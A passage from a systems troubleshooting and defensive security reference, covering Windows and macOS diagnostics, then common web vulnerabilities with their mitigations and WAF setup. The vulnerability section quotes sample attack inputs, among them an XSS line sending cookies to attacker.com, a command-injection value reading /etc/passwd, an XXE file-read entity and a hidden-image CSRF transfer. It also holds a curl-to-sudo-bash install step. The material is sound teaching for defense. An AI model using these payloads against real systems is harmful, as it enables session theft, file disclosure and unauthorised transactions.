Get-CimInstance Win32_PhysicalMemory | Select BankLabel, Capacity, Speed, Manufacturer
Get-CimInstance Win32_DiskDrive | Select Model, Size, MediaType, Status
Get-CimInstance Win32_NetworkAdapterConfiguration | Where-Object IPEnabled | Select Description, IPAddress, MACAddress
Get-CimInstance Win32_BIOS | Select Manufacturer, Name, Version, ReleaseDate
Get-CimInstance Win32_OperatingSystem | Select Caption, Version, InstallDate, LastBootUpTime
Get-CimInstance Win32_Product | Select Name, Version, Vendor, InstallDate | Sort-Object Name

# Security-focused WMI queries
Get-CimInstance Win32_UserAccount | Select Name, SID, Disabled, Lockout, PasswordRequired
Get-CimInstance Win32_Service | Where-Object {$_.StartMode -eq "Auto" -and $_.State -ne "Running"} | Select Name, DisplayName
Get-CimInstance Win32_Share | Select Name, Path, Description
Get-CimInstance Win32_LogonSession | Select LogonId, LogonType, StartTime
Get-CimInstance Win32_Process | Select ProcessId, Name, CommandLine, ExecutablePath | Sort Name

# WMI persistence (malware technique — audit this!)
Get-WMIObject -Namespace root\subscription -Class __EventFilter
Get-WMIObject -Namespace root\subscription -Class __EventConsumer
Get-WMIObject -Namespace root\subscription -Class __FilterToConsumerBinding
```

---

### 2.6 Windows Networking Diagnostics

```cmd
:: Network reset commands (run as Administrator)
netsh int ip reset resetlog.txt
netsh winsock reset catalog
netsh advfirewall reset
ipconfig /release
ipconfig /flushdns
ipconfig /renew
ipconfig /registerdns

:: Network statistics
netstat -ano                    :: All connections with PID
netstat -e                      :: Interface statistics
netstat -s -p tcp               :: TCP statistics
netstat -r                      :: Routing table

:: DNS cache
ipconfig /displaydns            :: View DNS cache
ipconfig /flushdns              :: Clear DNS cache

:: Test connectivity
ping -n 10 8.8.8.8              :: 10 pings
pathping google.com             :: tracert + ping statistics
tracert google.com

:: Windows Firewall
netsh advfirewall show allprofiles
netsh advfirewall firewall show rule name=all | findstr "Rule Name"
netsh advfirewall firewall add rule name="Block Telnet" protocol=TCP dir=in localport=23 action=block

:: Network shares
net share                       :: List all shares
net use                         :: List mapped drives
net view \\SERVERNAME           :: View shares on remote system

:: ARP cache
arp -a                          :: View ARP cache
arp -d *                        :: Clear ARP cache
```

---

## 3. macOS Deep-Dive Troubleshooting

### 3.1 log show & Unified Logging

macOS uses a unified logging system accessible via `log` command:

```bash
# Basic log queries
log show --last 1h                                    # Last hour
log show --last 1d                                    # Last day
log show --start "2024-01-01 00:00:00" --end "2024-01-02 00:00:00"
log show --predicate 'process == "loginwindow"' --last 1h
log show --predicate 'eventMessage contains "error"' --last 30m
log show --predicate 'subsystem == "com.apple.network"' --last 1h
log show --predicate 'category == "networking" AND eventType == "logEvent"'

# Stream logs in real-time
log stream --predicate 'process == "Safari"'
log stream --level debug --predicate 'subsystem == "com.apple.securityd"'
log stream --info --debug --predicate 'process == "kernel"'

# Privacy-sensitive log data (requires entitlement or root)
sudo log show --last 1h --info --debug

# Export logs
log collect --last 1h --output ~/Desktop/system.logarchive
log show ~/Desktop/system.logarchive --last 30m

# Crash logs location
ls ~/Library/Logs/DiagnosticReports/
ls /Library/Logs/DiagnosticReports/
ls /var/log/

# Console.app equivalent commands
log show --predicate 'eventMessage contains[cd] "crash"' --last 6h

# System and kernel logs
log show --predicate 'process == "kernel"' --last 1h | grep -i "error\|panic\|fault"
```

---

### 3.2 LaunchDaemon & LaunchAgent Debugging

```bash
# Locations
# /System/Library/LaunchDaemons/   - Apple system daemons (do not modify)
# /Library/LaunchDaemons/          - Third-party system-wide daemons (root)
# /Library/LaunchAgents/           - Third-party system-wide agents (user context)
# ~/Library/LaunchAgents/          - Per-user agents

# List all loaded jobs
sudo launchctl list                                     # All loaded (root)
launchctl list                                          # User-context loaded
launchctl list | grep -v "com.apple"                    # Third-party only (audit these!)

# Load/unload plists
sudo launchctl load /Library/LaunchDaemons/com.myapp.plist
sudo launchctl unload /Library/LaunchDaemons/com.myapp.plist
sudo launchctl load -w /Library/LaunchDaemons/com.myapp.plist   # -w = enable disabled

# Modern launchctl (macOS 10.10+)
sudo launchctl bootstrap system /Library/LaunchDaemons/com.myapp.plist
sudo launchctl bootout system /Library/LaunchDaemons/com.myapp.plist
launchctl print system/com.myapp.daemon                          # Detailed info
launchctl blame system/com.myapp.daemon                          # Why was it started?

# Validate a plist file
plutil -lint /Library/LaunchDaemons/com.myapp.plist

# Example LaunchDaemon plist
cat > /Library/LaunchDaemons/com.myapp.daemon.plist << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.myapp.daemon</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/local/bin/myapp</string>
        <string>--config</string>
        <string>/etc/myapp/config.plist</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StandardOutPath</key>
    <string>/var/log/myapp.log</string>
    <key>StandardErrorPath</key>
    <string>/var/log/myapp_error.log</string>
    <key>UserName</key>
    <string>_myapp</string>
    <key>GroupName</key>
    <string>_myapp</string>
</dict>
</plist>
EOF
sudo chown root:wheel /Library/LaunchDaemons/com.myapp.daemon.plist
sudo chmod 644 /Library/LaunchDaemons/com.myapp.daemon.plist
```

---

### 3.3 Network Configuration Fixes

```bash
# Network interface management
ifconfig                                     # All interfaces
ifconfig en0                                 # Specific interface
networksetup -listallnetworkservices         # List network services
networksetup -getinfo "Wi-Fi"               # Interface info
networksetup -setmanual "Wi-Fi" 192.168.1.10 255.255.255.0 192.168.1.1   # Static IP
networksetup -setdhcp "Wi-Fi"               # Back to DHCP

# DNS configuration
networksetup -getdnsservers "Wi-Fi"
networksetup -setdnsservers "Wi-Fi" 1.1.1.1 8.8.8.8
networksetup -setdnsservers "Wi-Fi" empty    # Remove custom DNS (use DHCP)

# DNS flush
sudo dscacheutil -flushcache
sudo killall -HUP mDNSResponder
sudo discoveryutil mdnsflushcache             # Older macOS

# Routing table
netstat -rn
route -n get default                         # Show default route
route add -net 10.0.0.0/8 192.168.1.1       # Add static route

# Wi-Fi diagnostics
/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -I   # Current Wi-Fi info
/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s   # Scan for networks
sudo /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -z  # Disassociate

# Packet capture on macOS
sudo tcpdump -i en0 -w ~/Desktop/capture.pcap
sudo tcpdump -i en0 port 443
# Or use Wireshark (install from https://wireshark.org)

# Network quality tool (macOS Monterey+)
networkQuality                               # Run speed/quality test

# Port scan / connectivity
nmap -p 80,443 google.com                   # (install: brew install nmap)
nc -zv google.com 443
```

---

### 3.4 DTrace & Instruments

> ⚠️ DTrace requires SIP (System Integrity Protection) to be partially disabled on modern macOS. Use `Instruments.app` GUI as a safer alternative.

```bash
# Check SIP status
csrutil status

# DTrace one-liners (macOS with DTrace enabled)
sudo dtrace -n 'syscall::open*:entry { printf("%s %s\n", execname, copyinstr(arg0)); }'    # File opens
sudo dtrace -n 'syscall::write:entry { printf("%d %s %d\n", pid, execname, arg2); }'        # Writes
sudo dtrace -n 'proc:::exec-success { printf("%s\n", curpsinfo->pr_psargs); }'              # Process execution

# Instruments command-line (xctrace - modern replacement)
xctrace list devices                         # List devices
xctrace record --template "Time Profiler" --output ~/Desktop/trace.xtrace --duration 10s -- ./myapp
xctrace record --template "System Trace" --output ~/Desktop/sys.xtrace --duration 30s

# Activity Monitor from command line
top -o cpu                                   # Sort by CPU
top -o rsize                                 # Sort by memory
vm_stat                                      # Virtual memory stats
vm_stat 1                                    # Continuous updates
```

---

### 3.5 macOS Recovery & FileVault

```bash
# Boot to Recovery Mode
# Intel Mac: Hold Cmd+R at startup
# Apple Silicon: Hold power button, select Recovery

# Check FileVault status
fdesetup status
fdesetup list                                # List enabled users
sudo fdesetup enable                         # Enable FileVault
sudo fdesetup disable                        # Disable FileVault

# Time Machine from command line
tmutil listbackups                           # List all backups
tmutil latestbackup                          # Show latest backup path
tmutil startbackup                           # Start backup
tmutil startbackup --auto --block            # Start and wait

# System Integrity Protection (SIP)
csrutil status                               # Check status
# To disable (in Recovery Terminal):
# csrutil disable

# Gatekeeper
spctl --status                               # Gatekeeper status
spctl --assess --verbose /Applications/MyApp.app   # Assess an app
sudo spctl --master-disable                  # Disable Gatekeeper (not recommended)

# XProtect malware signatures
system_profiler SPInstallHistoryDataType | grep -A2 XProtect
ls /Library/Apple/System/Library/CoreServices/XProtect.bundle/Contents/Resources/

# Notarization check
xcrun stapler validate /Applications/MyApp.app
spctl --assess -vvvv /Applications/MyApp.app
```

---

## 4. Defensive Cybersecurity & Vulnerability Theory

> ⚠️ **Important:** All vulnerability descriptions below are provided **strictly for educational and defensive purposes**. No functional exploit code is included. The focus is understanding the attack vector and implementing mitigations.

---

### 4.1 SQL Injection (SQLi)

#### How It Works (Theory)

SQL Injection occurs when user-supplied data is incorporated into a database query without proper sanitization, allowing an attacker to modify the query's logic.

**Vulnerable Pattern:**
```python
# VULNERABLE — Never do this
username = request.form['username']
password = request.form['password']
query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
```

If an attacker inputs `' OR '1'='1`, the query becomes:
```sql
SELECT * FROM users WHERE username='' OR '1'='1' AND password='' OR '1'='1'
-- This always evaluates to TRUE — authentication bypass!
```

**Types:**
- **In-band SQLi** — Error-based (extract via error messages) or Union-based (extra SELECT)
- **Blind SQLi** — Boolean-based (yes/no responses) or Time-based (delays reveal info)
- **Out-of-band SQLi** — Data exfiltration via DNS or HTTP to attacker-controlled server

#### Defenses

```python
# DEFENSE 1: Parameterized Queries (Prepared Statements) — THE GOLD STANDARD
import sqlite3

conn = sqlite3.connect('database.db')
cursor = conn.cursor()

# Correct — parameters are never interpreted as SQL
username = request.form['username']
password = request.form['password']
cursor.execute("SELECT * FROM users WHERE username=? AND password=?", (username, password))

# Python with SQLAlchemy ORM
from sqlalchemy import text
result = db.session.execute(
    text("SELECT * FROM users WHERE username=:username"),
    {"username": username}
)

# DEFENSE 2: Stored Procedures (properly implemented)
# SQL Server example:
# CREATE PROCEDURE GetUser @Username NVARCHAR(50), @Password NVARCHAR(50)
# AS
#     SELECT * FROM users WHERE Username=@Username AND Password=@Password
# GO

# DEFENSE 3: Input Validation
import re

def validate_username(username):
    # Allow only alphanumeric and underscore
    if not re.match(r'^[a-zA-Z0-9_]{3,30}$', username):
        raise ValueError("Invalid username format")
    return username

# DEFENSE 4: Web Application Firewall (WAF) rules
# Example Nginx + ModSecurity rule:
# SecRule ARGS "@detectSQLi" "id:100,phase:2,block,msg:'SQL Injection'"

# DEFENSE 5: Principle of least privilege for DB accounts
# Application DB user should only have SELECT, INSERT, UPDATE on needed tables
# NEVER use sa/root/admin DB account in application code
```

**Additional Mitigations:**
- Enable WAF with SQLi detection rules
- Use ORM frameworks that abstract SQL
- Database account should be read-only when possible
- Never display raw database error messages to users
- Regular penetration testing
- Refer to [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- Monitor CVE databases: [CVE MITRE](https://cve.mitre.org)

---

### 4.2 Cross-Site Scripting (XSS)

#### How It Works (Theory)

XSS occurs when an application includes user-supplied data in its output without proper escaping, allowing attackers to inject JavaScript that executes in victims' browsers.

**Three Types:**
- **Reflected XSS** — Payload is in the URL/request, reflected immediately in response
- **Stored XSS** — Payload is saved to the database and served to all users (most dangerous)
- **DOM-based XSS** — Vulnerability is in client-side JavaScript processing

```html
<!-- VULNERABLE: Directly inserting user input into HTML -->
<!-- If user submits: <script>document.location='https://attacker.com/steal?c='+document.cookie</script> -->
<p>Hello, <%=username%>!</p>
```

#### Defenses

```javascript
// DEFENSE 1: Output Encoding — Escape for the correct context

// HTML encoding (use a library, don't write your own!)
// Node.js with DOMPurify:
const DOMPurify = require('dompurify');
const { JSDOM } = require('jsdom');
const window = new JSDOM('').window;
const purify = DOMPurify(window);
const clean = purify.sanitize(userInput);

// Python with html module:
import html
safe_output = html.escape(user_input)

// Java with OWASP Java Encoder:
// import org.owasp.encoder.Encode;
// String safeHtml = Encode.forHtml(userInput);

// DEFENSE 2: Content Security Policy (CSP) HTTP Header
// Nginx configuration:
// add_header Content-Security-Policy "default-src 'self'; script-src 'self' 'nonce-{RANDOM}'; style-src 'self'; img-src 'self' data:; font-src 'self'; connect-src 'self'; frame-ancestors 'none';" always;

// DEFENSE 3: HttpOnly and Secure Cookie Flags
// This prevents cookie theft via XSS even if it occurs
// Python Flask:
app.config['SESSION_COOKIE_HTTPONLY'] = True
app.config['SESSION_COOKIE_SECURE'] = True
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'

// DEFENSE 4: Use template engines that auto-escape
// Jinja2 (Python) — auto-escaping enabled:
// {{ user_input }}   — safe (auto-escaped)
// {{ user_input|safe }}  — UNSAFE, only use for trusted content

// React — JSX auto-escapes:
// <p>{userInput}</p>    — safe
// <p dangerouslySetInnerHTML={{__html: userInput}} />  — UNSAFE

// DEFENSE 5: X-XSS-Protection header (legacy browsers)
// add_header X-XSS-Protection "1; mode=block" always;
```

**References:**
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [Content Security Policy Reference](https://content-security-policy.com/)

---

### 4.3 Buffer Overflow

#### How It Works (Theory)

A buffer overflow occurs when a program writes more data to a buffer than it can hold, overwriting adjacent memory. In classic stack-based overflows, this can overwrite the function's return address.

**Memory Layout (Simplified Stack Frame):**
```
High Memory
+---------------------------+
| Function Arguments        |
+---------------------------+
| Return Address            |  ← Target: overwrite to control execution flow
+---------------------------+
| Saved Base Pointer (EBP)  |
+---------------------------+
| Local Variable: buffer[]  |  ← Vulnerable: insufficient bounds checking
|  [64 bytes allocated]     |
|  [user writes 100 bytes!] |  ← Overflow!
+---------------------------+
Low Memory
```

```c
// VULNERABLE C code pattern
void vulnerable_function(char *input) {
    char buffer[64];
    strcpy(buffer, input);  // No bounds check! If input > 64 bytes, overflow occurs
}

// SAFER alternatives
void safe_function(char *input) {
    char buffer[64];
    strncpy(buffer, input, sizeof(buffer) - 1);  // Limit copy length
    buffer[sizeof(buffer) - 1] = '\0';            // Ensure null termination
    
    // Even better: use strlcpy (BSD) or snprintf
    snprintf(buffer, sizeof(buffer), "%s", input);
}
```

#### Defenses (Modern Mitigations)

| Mitigation | Description | How it Helps |
|------------|-------------|--------------|
| **ASLR** | Address Space Layout Randomization | Randomizes memory locations, making addresses unpredictable |
| **Stack Canaries** | Compiler places random value before return address | Detects stack corruption before function returns |
| **NX/DEP** | Non-Executable Stack / Data Execution Prevention | Prevents executing code injected into data areas |
| **SafeStack** | LLVM compiler feature | Separates safe and unsafe stacks |
| **CFI** | Control Flow Integrity | Restricts indirect calls/jumps to valid targets |
| **PIE** | Position Independent Executable | Works with ASLR for full randomization |

```bash
# Check binary security features on Linux
checksec --file=./myprogram            # Install: apt install checksec
readelf -a ./myprogram | grep -E "GNU_STACK|RELRO|PIE"

# Enable stack protection in GCC
gcc -fstack-protector-strong -D_FORTIFY_SOURCE=2 -pie -fPIE -Wl,-z,relro,-z,now myapp.c -o myapp

# Verify ASLR is enabled on Linux
cat /proc/sys/kernel/randomize_va_space   # 2 = full ASLR

# Enable ASLR
echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
# Make permanent:
echo "kernel.randomize_va_space = 2" | sudo tee -a /etc/sysctl.conf
```

---

### 4.4 CSRF & SSRF

#### Cross-Site Request Forgery (CSRF)

CSRF tricks a logged-in victim into unknowingly sending a forged request to a web application.

```html
<!-- CSRF attack scenario: Attacker hosts a page with: -->
<!-- Victim visits attacker page while logged into bank -->
<!-- Browser automatically sends victim's cookies to bank -->
<img src="https://bank.com/transfer?amount=1000&to=attacker" style="display:none">
```

**Defenses:**
```python
# DEFENSE 1: CSRF Tokens (Synchronizer Token Pattern)
# Flask-WTF example:
from flask_wtf import FlaskForm
from wtforms import StringField, SubmitField
class TransferForm(FlaskForm):
    amount = StringField('Amount')
    submit = SubmitField('Transfer')
# Form automatically includes hidden CSRF token field

# DEFENSE 2: SameSite Cookie Attribute
# Set-Cookie: sessionid=abc123; SameSite=Strict; Secure; HttpOnly
# SameSite=Strict — cookie never sent in cross-site requests
# SameSite=Lax    — cookie sent on top-level navigation only

# DEFENSE 3: Double Submit Cookie Pattern
# Server generates random token, client sends it both as cookie AND request param
# Attacker can't read cookie (same-origin policy), so can't forge the param

# DEFENSE 4: Check Origin/Referer Headers
# Verify that the Origin header matches expected origin
# (Can be absent from some requests, so use as secondary check only)
```

#### Server-Side Request Forgery (SSRF)

SSRF allows attackers to induce the server to make requests to internal resources.

**Vulnerable Pattern:**
```python
# VULNERABLE: User controls the URL the server fetches
url = request.args.get('image_url')
response = requests.get(url)  # Attacker could request http://169.254.169.254/latest/meta-data/
```

**Defenses:**
```python
import ipaddress
from urllib.parse import urlparse

ALLOWED_SCHEMES = {'http', 'https'}
ALLOWED_DOMAINS = {'api.example.com', 'cdn.example.com'}
BLOCKED_RANGES = [
    ipaddress.ip_network('10.0.0.0/8'),
    ipaddress.ip_network('172.16.0.0/12'),
    ipaddress.ip_network('192.168.0.0/16'),
    ipaddress.ip_network('127.0.0.0/8'),
    ipaddress.ip_network('169.254.0.0/16'),  # Link-local (AWS metadata)
    ipaddress.ip_network('::1/128'),          # IPv6 localhost
    ipaddress.ip_network('fc00::/7'),         # IPv6 private
]

def is_safe_url(url: str) -> bool:
    parsed = urlparse(url)
    
    # Check scheme
    if parsed.scheme not in ALLOWED_SCHEMES:
        return False
    
    # Check domain whitelist
    if parsed.hostname not in ALLOWED_DOMAINS:
        return False
    
    # Resolve and check IP
    import socket
    try:
        ip = ipaddress.ip_address(socket.gethostbyname(parsed.hostname))
        for blocked in BLOCKED_RANGES:
            if ip in blocked:
                return False
    except Exception:
        return False
    
    return True
```

---

### 4.5 Command Injection

When user input is passed to a shell command without sanitization:

```python
# VULNERABLE
filename = request.args.get('file')
os.system(f"convert {filename} output.pdf")  # Attacker sends: file.jpg; cat /etc/passwd

# DEFENSE 1: Avoid shell=True, use argument lists
import subprocess

filename = request.args.get('file')
# Validate first
if not re.match(r'^[a-zA-Z0-9_\-\.]+$', filename):
    abort(400)

subprocess.run(['convert', filename, 'output.pdf'], shell=False, check=True)
# shell=False means no shell interpretation — ; | & etc. are literal chars

# DEFENSE 2: Use parameterized approaches for everything
# Never use shell=True unless absolutely necessary

# DEFENSE 3: Whitelist allowed input values
ALLOWED_FORMATS = {'jpg', 'png', 'gif', 'webp'}
ext = filename.rsplit('.', 1)[-1].lower()
if ext not in ALLOWED_FORMATS:
    abort(400)
```

---

### 4.6 Insecure Deserialization

When untrusted data is deserialized without validation:

```python
# VULNERABLE: Python pickle deserialization
import pickle

# Pickle can execute arbitrary code during deserialization
data = request.get_data()
obj = pickle.loads(data)  # NEVER deserialize untrusted pickle data!

# DEFENSE 1: Use safe formats (JSON) instead of pickle/java serialization
import json
data = request.get_json()
obj = json.loads(data)  # JSON cannot execute code

# DEFENSE 2: If serialization is needed, use HMAC signature verification
import hmac, hashlib

SECRET_KEY = os.environ['SECRET_KEY']

def serialize_safe(obj):
    data = pickle.dumps(obj)
    sig = hmac.new(SECRET_KEY.encode(), data, hashlib.sha256).hexdigest()
    return sig + ':' + data.hex()

def deserialize_safe(payload):
    sig, data_hex = payload.split(':', 1)
    data = bytes.fromhex(data_hex)
    expected_sig = hmac.new(SECRET_KEY.encode(), data, hashlib.sha256).hexdigest()
    if not hmac.compare_digest(sig, expected_sig):
        raise ValueError("Invalid signature — data tampered!")
    return pickle.loads(data)

# DEFENSE 3: For Java, use ObjectInputFilter or avoid Java serialization entirely
```

---

### 4.7 XXE Injection

XML External Entity (XXE) attacks exploit XML parsers that process external entity declarations:

```xml
<!-- Attacker-supplied XML: -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>
  <name>&xxe;</name>
</user>
<!-- The parser reads /etc/passwd and includes it in the response! -->
```

**Defenses:**
```python
# Python lxml — disable external entities
from lxml import etree

parser = etree.XMLParser(
    resolve_entities=False,    # Disable entity resolution
    no_network=True,           # Disable network access
    dtd_validation=False,      # Disable DTD validation
    load_dtd=False             # Don't load external DTDs
)

tree = etree.fromstring(xml_data, parser=parser)

# Python defusedxml library — safe XML parsing
import defusedxml.ElementTree as ET
tree = ET.fromstring(xml_data)  # Safe by default

# Java — disable XXE in DocumentBuilderFactory:
# dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
# dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
# dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
# dbf.setXIncludeAware(false);
# dbf.setExpandEntityReferences(false);
```

---

### 4.8 Path Traversal

```python
# VULNERABLE: User controls file path
filename = request.args.get('file')
with open(f'/var/www/files/{filename}', 'r') as f:
    # Attacker sends: ../../etc/passwd
    return f.read()

# DEFENSE 1: os.path.realpath + prefix check
import os

BASE_DIR = '/var/www/files'

def safe_file_open(filename):
    # Resolve to absolute path (resolves ../ and symlinks)
    requested_path = os.path.realpath(os.path.join(BASE_DIR, filename))
    
    # Verify the resolved path starts with our base dir
    if not requested_path.startswith(BASE_DIR + os.sep):
        raise PermissionError("Access denied: Path traversal detected")
    
    return open(requested_path, 'r')

# DEFENSE 2: Whitelist allowed filenames/characters
import re
if not re.match(r'^[a-zA-Z0-9_\-]+\.(txt|pdf|png)$', filename):
    abort(400, "Invalid filename")

# DEFENSE 3: Use pathlib (Python 3.6+)
from pathlib import Path

base = Path('/var/www/files').resolve()
requested = (base / filename).resolve()

if not str(requested).startswith(str(base)):
    abort(403)
```

---

### 4.9 IDOR & Broken Access Control

Insecure Direct Object Reference: Accessing resources by directly manipulating an identifier.

```python
# VULNERABLE: No authorization check — user can access any user's data
@app.route('/api/users/<int:user_id>/profile')
def get_profile(user_id):
    return db.query(User).get(user_id)  # Any authenticated user can access any profile!

# DEFENSE: Always verify ownership/permission
@app.route('/api/users/<int:user_id>/profile')
@login_required
def get_profile(user_id):
    # Check that the requesting user owns this resource (or is admin)
    if current_user.id != user_id and not current_user.is_admin:
        abort(403, "Access denied")
    
    user = db.query(User).get(user_id)
    if not user:
        abort(404)
    
    return jsonify(user.to_dict())

# DEFENSE 2: Use indirect references (map UUIDs/tokens to IDs server-side)
import uuid

# When creating a resource:
token = str(uuid.uuid4())
db.save({'token': token, 'user_id': user_id, 'resource_id': resource_id})

# When accessing: look up by token, then verify permission
resource = db.get_by_token(token)
if resource.user_id != current_user.id:
    abort(403)
```

---

### 4.10 Race Conditions & TOCTOU

Time-of-Check to Time-of-Use: A race between checking a condition and using the resource.

```python
# VULNERABLE TOCTOU pattern
def withdraw(amount):
    balance = db.get_balance(user_id)           # CHECK
    if balance >= amount:
        time.sleep(0)  # Race window here!
        db.update_balance(user_id, balance - amount)  # USE
        return True

# Two simultaneous requests can both pass the check!

# DEFENSE 1: Atomic database operations
def withdraw_safe(amount):
    result = db.execute("""
        UPDATE accounts 
        SET balance = balance - %s
        WHERE user_id = %s AND balance >= %s
        RETURNING balance
    """, (amount, user_id, amount))
    
    if not result:
        return False  # Insufficient funds
    return True

# DEFENSE 2: Database row locking
def withdraw_locked(amount):
    with db.transaction():
        # Lock the row for update
        balance = db.execute(
            "SELECT balance FROM accounts WHERE user_id=%s FOR UPDATE",
            (user_id,)
        ).fetchone()
        
        if balance >= amount:
            db.execute(
                "UPDATE accounts SET balance=balance-%s WHERE user_id=%s",
                (amount, user_id)
            )
            return True
    return False

# DEFENSE 3: Application-level mutex (distributed lock)
import redis
import uuid

def withdraw_with_lock(amount, user_id):
    r = redis.Redis()
    lock_key = f"lock:account:{user_id}"
    lock_value = str(uuid.uuid4())
    
    # Acquire lock with expiry
    if r.set(lock_key, lock_value, nx=True, ex=5):
        try:
            return withdraw(amount)
        finally:
            # Release lock (check value to avoid releasing someone else's lock)
            if r.get(lock_key) == lock_value.encode():
                r.delete(lock_key)
    else:
        raise Exception("Could not acquire lock")
```

---

### 4.11 Cryptographic Weaknesses

#### What NOT to Use (and Why)

| Algorithm | Type | Status | Reason |
|-----------|------|--------|--------|
| MD5 | Hash | ❌ Broken | Collision attacks, trivial rainbow tables |
| SHA-1 | Hash | ❌ Deprecated | Practical collision attacks demonstrated |
| DES | Cipher | ❌ Broken | 56-bit key, brute-forceable |
| 3DES | Cipher | ⚠️ Legacy | SWEET32 attack, slow |
| RC4 | Stream | ❌ Broken | Statistical biases exploitable |
| ECB mode | Block mode | ❌ Insecure | Patterns visible in ciphertext |
| RSA < 2048-bit | Asymmetric | ❌ Weak | Factorizable |
| DSA | Signing | ⚠️ Caution | Requires perfect RNG; nonce reuse catastrophic |

#### What TO Use

```python
# PASSWORD HASHING — Use bcrypt, Argon2, or scrypt (NOT SHA/MD5!)
from argon2 import PasswordHasher
ph = PasswordHasher(time_cost=3, memory_cost=65536, parallelism=4)
hash = ph.hash(password)
ph.verify(hash, password)  # Verify

# OR bcrypt
import bcrypt
hashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))
bcrypt.checkpw(password.encode(), hashed)

# SYMMETRIC ENCRYPTION — AES-256-GCM (authenticated encryption)
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import os

key = os.urandom(32)    # 256-bit key — NEVER hardcode, use key management
nonce = os.urandom(12)  # 96-bit nonce — NEVER reuse with same key!
aad = b"additional_authenticated_data"  # Optional

aesgcm = AESGCM(key)
ciphertext = aesgcm.encrypt(nonce, plaintext, aad)
plaintext = aesgcm.decrypt(nonce, ciphertext, aad)  # Raises exception if tampered

# ASYMMETRIC ENCRYPTION — RSA-OAEP or ECDH
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import hashes

private_key = rsa.generate_private_key(public_exponent=65537, key_size=4096)
public_key = private_key.public_key()

# Encrypt
ciphertext = public_key.encrypt(
    message,
    padding.OAEP(mgf=padding.MGF1(hashes.SHA256()), algorithm=hashes.SHA256(), label=None)
)

# DIGITAL SIGNATURES — Ed25519 (preferred) or RSA-PSS
from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey
private_key = Ed25519PrivateKey.generate()
signature = private_key.sign(message)
public_key = private_key.public_key()
public_key.verify(signature, message)  # Raises if invalid

# HMAC for message authentication
import hmac, hashlib, os
key = os.urandom(32)
mac = hmac.new(key, message, hashlib.sha256).digest()
# Verify — use hmac.compare_digest to prevent timing attacks
hmac.compare_digest(mac, received_mac)

# RANDOM NUMBER GENERATION — Use os.urandom or secrets, NEVER random module
import secrets
token = secrets.token_urlsafe(32)     # URL-safe random token
otp = secrets.randbelow(1000000)      # Cryptographically secure random int
```

---

### 4.12 Supply Chain Attacks

Supply chain attacks compromise software before it reaches end users — targeting package registries, build systems, or dependencies.

**Notable Examples:** SolarWinds (2020), XZ Utils backdoor (2024), Log4Shell, event-stream npm package

**Defenses:**
```bash
# Python: Pin dependencies with hashes
pip install --require-hashes -r requirements.txt

# Generate hashed requirements:
pip-compile --generate-hashes requirements.in

# requirements.txt with hashes:
# requests==2.31.0 \
#     --hash=sha256:58cd2187423d77b898... \
#     --hash=sha256:...

# npm: Use lockfiles and audit
npm audit                          # Check for known vulnerabilities
npm audit fix                      # Auto-fix where possible
npm ci                             # Install from lockfile (reproducible)
npm install --save-exact           # Pin exact versions

# Verify package integrity
npm pack package-name              # Download and inspect before installing

# Use private npm registry with curation
# Tools: Verdaccio, Artifactory, Nexus

# GitHub Actions: Pin actions to specific commit SHA
# VULNERABLE:
# uses: actions/checkout@v3
# SAFE:
# uses: actions/checkout@8ade135a41bc03ea155e62e844d188df1ea18608

# Sigstore / Cosign — Sign and verify artifacts
cosign sign myimage:latest
cosign verify myimage:latest --certificate-identity=...

# SBOM (Software Bill of Materials) — track all components
syft myimage:latest -o spdx-json > sbom.json
grype myimage:latest              # Scan SBOM for vulnerabilities
```

---

## 5. Security Tools & Implementation

### 5.1 Web Application Firewalls (WAF)

#### SafeLine WAF Setup

[SafeLine](https://github.com/chaitin/SafeLine) is a self-hosted WAF based on Nginx with intelligent detection.

```bash
# Install SafeLine via Docker (recommended)
curl -fsSL https://waf.chaitin.com/release/latest/manager.sh | sudo bash

# Or manual Docker Compose installation
git clone https://github.com/chaitin/SafeLine.git
cd SafeLine
cp .env.example .env
# Edit .env: set SAFELINE_DIR, POSTGRES_PASSWORD, SUBNET_PREFIX
sudo docker-compose up -d

# Access admin panel at https://your-server:9443
# Default credentials shown on first run
```

#### ModSecurity with OWASP CRS

```bash
# Install ModSecurity + Nginx
sudo apt install libmodsecurity3 libnginx-mod-http-modsecurity

# Download OWASP Core Rule Set
cd /etc/modsecurity
sudo git clone https://github.com/coreruleset/coreruleset.git
sudo cp coreruleset/crs-setup.conf.example coreruleset/crs-setup.conf

# Nginx ModSecurity configuration
cat > /etc/nginx/conf.d/modsecurity.conf << 'EOF'
modsecurity on;
modsecurity_rules_file /etc/nginx/modsecurity.d/modsecurity.conf;
EOF

cat > /etc/nginx/modsecurity.d/modsecurity.conf << 'EOF'
Include /etc/modsecurity/modsecurity.conf
Include /etc/modsecurity/coreruleset/crs-setup.conf
Include /etc/modsecurity/coreruleset/rules/*.conf
SecRuleEngine On
SecRequestBodyAccess On
SecResponseBodyAccess Off
SecAuditLog /var/log/nginx/modsec_audit.log
SecAuditEngine RelevantOnly
SecAuditLogParts ABIJDEFHZ
EOF

sudo nginx -t && sudo systemctl reload nginx

